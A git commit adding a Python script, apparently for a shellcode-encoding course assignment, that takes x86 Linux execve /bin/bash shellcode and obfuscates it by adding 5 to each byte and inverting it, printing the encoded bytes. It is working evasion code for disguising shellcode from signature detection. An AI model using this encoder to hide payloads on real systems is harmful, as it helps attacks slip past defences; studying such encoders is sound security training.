221ccca0ca243e54594ba2747e8e91ba28ab3899
nalahoz <48832379+nalahoz@users.noreply.github.com>
2019-04-01 18:53:45 +0200

    Create Encoder.py

---
+++ 04 - Assignment/Encoder.py
@@ -0,0 +1,28 @@
+#!/user/bin/python
+
+# Python Encoder increment and complement
+
+INCREMENT = 0x05
+
+# Shellcode
+
+shellcode = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+encoded = ""
+encoded2= ""
+y = ""
+
+# Encode by adding INCREMENT value and complementing (NOT)
+
+for i in bytearray(shellcode):
+
+
+	i += INCREMENT					# Value to increment
+	y = ~i						# NOT
+	encoded += '\\x'
+	encoded += '%02x' % (y & 0xff)
+	encoded2 += '0x'
+	encoded2 += '%02x,' % (y & 0xff)
+
+print("Length: %d" % (len(bytearray((shellcode)))))
+print(encoded + "\n")
+print(encoded2 + "\n")
